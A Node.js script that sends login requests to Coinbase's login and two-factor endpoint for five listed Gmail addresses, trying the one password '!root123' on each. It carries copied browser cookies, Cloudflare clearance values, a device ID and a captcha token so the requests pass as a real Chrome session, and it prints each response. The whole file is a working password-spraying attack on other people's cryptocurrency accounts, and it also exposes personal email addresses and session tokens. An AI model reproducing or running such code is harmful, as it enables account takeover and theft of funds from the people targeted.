const axios = require("axios");

const emails = [
  "alexanderlukienko@gmail.com",
  "tuanagoktug7@gmail.com",
  "libinixa3@gmail.com",
  "sonirobi808@gmail.com",
  "seyedmehdijenab1354@gmail.com",
];

const headers = {
  authority: "login.coinbase.com",
  method: "POST",
  path: "/api/two-factor/v1/verify",
  scheme: "https",
  Accept: "application/json",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Content-Length": "3258",
  "Content-Type": "application/json",
  Cookie:
    "cb_dtm=0be6d76e0-bb87-44db-a7f9-40b4d441baa9; coinbase_device_id=801944a0-90b4-415f-a88f-18bc460162ef; advertising_sharing_allowed=[%22value%22:true]; cm_default_preferences=[%22region%22:%22DEFAULT%22,%22consent%22:[%22necessary%22,%22performance%22,%22functional%22,%22targeting%22]]; df3=92229feb635c80b67fe13740f6e6a14fe%22; cookies-banner=%22dismissed%22; cf_clearance=TOizQr3p8DPS5GJ9T5KL455bxO_JZd7W9g8F3224-1718306685-1.0.1.1-ELAtaqvGatOhefaSw21RLvRpJyGpxlNE8T0Y1UXSfzwFaE7utlt2tAsLGFU8OQqKeTliFCAD488tyXzA; __cf_bm=hNJyJXzMRQDWL15m5wb3tBI05bKzPajLsh6iAY-1718691263-1.0.1.1-b4E8uJ3W0r1F5e6e5vFAdDeFWlR6jiupdTzKf8gfR6EemZIMXeboublwLnxNaSh6c3z.YnqILqlS5cPZL7Gg; df2=11b88475d4f2d13bd0e19cfedbcc4b0d; login-session=MTcXODSYMTI2UMXxxWTU1pXMt3VmIVM3GJe1hWcz291N1E2MjZESXA2RTUUbJdRMnt5RFN2RmZjU1jZhU2F6R3NmY2JlMpPdUIRNZhdNeg5SzBMekJfa3cT1Uq9VVkzZUZtmxcDhoMmNZNG1V0RnVyW9kX9ZStojdWnUtbHY3NfWmMEkx4tUT2wyYZOTKUHRDY3h5FhkbW3Fena4ZFlFXLZK6WXpVQnhxzjF5ck1zcDRcWRNDn193fTl2dkkG4zZES0X0NMWUpaVXuhUHXMHfWllbzFN6I0tnY1ZnOE4lM1Jhb9m1UDl3NFadh61lWbRDbGRmZrZfjY3fOENFLDRSU2ICGuldmZjrB1Ham1rMW8WX0BWBQWFSTMW1y1pSNWPOTNhcGpwWH8hTnFSRnZvSXYalMNCsTdV0DczRtuXz293SU4OXVU6XMU09fPlnOSPgWRrDa_3qRsl0lgVzVUQQd_CVfmMdgygZvZ",
  "Identity-Version": "verify@9.5.6",
  Origin: "https://login.coinbase.com",
  Priority: "u=1, i=1",
  "Project-Id": "2TqKlTa2R2EusAZhx4IyrQvuRu",
  Referer: "https://login.coinbase.com/",
  "Sec-Ch-Ua":
    '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": '"Windows"',
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "X-Two-Factor-Client-Id": "258660e1-9cfe-4202-9eda-d3beedb3e118",
};

const verify = async () => {
  for (var i = 0; i < emails.length; i++) {
    const params = {
      password: {
        email: emails[i],
        password: "!root123",
      },
      constraints: {
        mode: "ALLOW",
        types: ["WALLET", "PASSWORD", "PASSKEY", "OAUTH_GOOGLE", "OAUTH_APPLE"],
      },
      action: "web-UnifiedLogin-IdentificationPrompt",
      bot_token:
        "03AFcWeA672HUb_ZsZyY5_w3DhW8n1JVajAJ1gorTJPPq8USIJnU_HjgD1DP_CuLJ0xXVf3_DHexvu7WGr6GyDWUP6fyon91D8QuQh_cpoMREdAfMJtsfwQ_X2VrNoCFlxg8IRu9GYeDcAP5Dv5o6QJU6ox3PsGhWQi94xBJJs8YuQmQwNhl-w37nrMXpasIl8vuj_21gTf7WhsgCG6NUNF1Df-fdhb2zR2l26vAerlwVJ6aJPxNea5rQI3ut1C0i9jBb-RDBQ925YJe_6MR1thwAVza6S-323yjNjHwQKvhBHxI4UsQos8WGi6_TJYaYz-lZGg5hozTb4uWa_ZFl3ljdVW-2BnlmkbL06MVjoOaVrA9L87_SrgZgDypTTbd6JSwVzgSKMPnYQKHxqJHjbuZ7kZWmM_asLzw02H3nA7K1MCdtahn8hnTPGLv1oWfwUaVfLcF0vCgtYS4xHIt641lDrR7ZbjeFfeuFxojyPTgPCJ6JJmt17RBCigibjat9MQE4iAyx7XPYMnA_GGuZmN_KTxO6jpiLLLn4kR6KfoKXs99ESCPetdvBDf19AwYcO2raE2rgKuroBSxNR_9r_6bLmIu3d7yn4kHposRWmQlYqc7zJBjgT5ZffTCCGCUxlLnLKmeITjdxKKUfk2j6PB4v6ibkqmSoYDQPPNL4VsuUJfDIoHyP0gCraThmNVlGOIROpcLI3_aIXs7Zd-YLGa-TqPvABNPJ_RXPW8wQIuC-gyrAaUvsSGf9drN96gsM_AjqMqhEoEeCxi51PNuhxQGqJSvGSYYEtJ4GUbV17gww3fwos0Z7MX1IGCSJccEpwIXPG56UUgFt8ZHsivFoxJiW84TZfO6aQl_FOLu3w15YCj-GRwVH1sGd_Bj3DCgaMhJnE7E6d3jDROJ5UXxeN_HbGEDnibQmiUQ7EMD-4ut2nejp5Q1dtc3xHBoCw5DQT_D6EgST1g82UhKvIexir28WqN6nzUC7XCPu11ne36xxCv4xODyvpWGq4FCJH2bJtoEp12uOTRlUr6u1B_32G7ST6iwZzcNJOCXL2w48R1qdZdKkM3WW19he3yzJfy87CDEb2MSOkb-fVSY7Qo_sPE5xi64tAPfJJJH9QDPZEv11ETTuBAR5T4qkX6IN1Y2zBee95_Ya10GDPwd8D6Rfa0ktM8HDiDOwO66d1BWM2iPAi5me4YBu5qYVjbTOPRp3nwNKgOc06zbRL6gD1IOv9w6f8LVyM4eyGi5ELgkb6BLl-WMr8j-6ZwwxEG9EOBSl4o8XJsv0BdhruzTcqj4escLE_mfyjJCB4iCGoerHosFsKlhkTxJmFJJE2JKBkoey62JlcMC42VGTR5Hur2ZT8pICpDmsT6POKKlxQRzLF9nEcEbmJvZiptssHHlWXw1wQt7i4SgZ4-tUh7uM9c5D4vLj5ZVJbtqwRnS1_AfhVEIXi9mS8e04KRexm51B6Awr-wDQ8CRnRDtMtVTFEIYTcoXF7P929zZ0upCzNaUL2igOL2AwEZ0C9sNRtaPbRnfgLGOmG2qENsQ9AGAd8FAlpEEh-mGQ893upjZe3FfW8Ghpl2du_Wss9hpWdXV3408ut1tMmyE7hoFo1gH95iYOY3nhkmZh2-Q2gY0K1mweLI1XeFPUKIAJEzAsuH88T7Yf7jUueH_FNCzCJLmFyHS2qTkKelZbdZ8mDcc7BagTwHb6iJPgpIQPScLfwEvnim7tgIkk4Vbp4QBnM11f5e9-vVGY6BOwcUf7PVW4YEay_XgyWkj4i-Dbrrq7vwEwJ_f2Ajr4QLMk1PWjScxwfS9QMInzKj6RbGgttXpm2wqgS2kOi8R3RFe_RLjD5PCyjcZIGZdL478pzrADlSBN8Sl-b5QEx-PFLA8YOx6dfOKKzB-ZmfxLA-q-8RREBWjeIpxpIv6fdkG2EtVtATAlP-zX28zH1Yi6ZMr38ZB-gtO15vSk3C5scMSd6t_PJOR6qOEp_s8ia17hr99zqnyh9880o3XdKJXPU_9oCCBDw62oXoVQ3C49dsSee5RT-r7ahstpr75n5WWXQfkjaPuDgCQNsEZgb9eokWIMouUp7rCVQ7nWj1pkWkvJO73JYXXHduU0SgkYXEibsZV6DSPhswjgkTefHwIPE0gUy4VFwteWvRwHKiMakiD3rRYXRLjhAD8lHzkHqIi0eAXSG4SIRmV5AqEg5nOFPQhvQtFqRDmg2iiOVL3fVK1hghdo0PrpaiDtkZRoTHGsti6YX8dxLiYkSJefwgcKTdMU_pNRyU3Uu1kJF6S6GamF-eioH1g2KU7NqJCOEya8qxsLBSwcIvN-xEkVIrVNYoLKIhVKPwtKLx-o932x7jnKOnABuBXPlx0JA434yTb_exVd_BC_WLmxrqA5W9_KYuwwaIPfan1CqW5sLkFP48-jOz_JfrvPOQZCFaN5bjjzmQfZMSLaJZYiX1N_biqdRlfXJUeD82jfrvGucTPr3dUD43PgkT5IqaeHFHJ2uRaCPThe997naPoi_0ElNBAl6JIwallYoU9aFC5UK_4G4q5vD8h5HJBAKz3bKCijSOmXmEIaePPpkfmBN6tH5X4ZnDlt1CUE4tLrVnZ4zcFFbtwUIqoTZCFiDBHWRVP98o4NAhJ6mUOYORdGJ0H0Ce6R4xnqSt1D7XFsCzzf5jY3-hHyll6CP8AmzyGMIODMoqr3WzQrUc8t0IdPn4EnEl4WH_69RaHq9HByt16hgtJJ_KKvsUckw1NLQEP65uyBGSMo4gICnQEwru1xEyXIhHxo67GUF5nV53E0_MbciDKziUBVS0xUBkKDyFYJMkzjHmXxp3Vb-31Qh3ikmVjzn-OmM_tKhDm-aPa5MAKEr-pCt-eYUByz3eXlSLG0VbR3JhYw4zBs6wvWZ0_5N-QKBpFfOusoCZD_C9v-OImHdibIRpuY7PP2qNDJgAkq-B1e8wi3lyIlBpwGusLeuJWGKf-FrXmcPDxeSReb0cCPrPK__3DGZ84hwgBc3BTuKqar7uz3HFjU-",
    };

    const response = await axios.post(
      "https://login.coinbase.com/api/two-factor/v1/verify",
      params,
      { headers }
    );
    console.log(response, "----", emails[i]);
  }
};

verify();
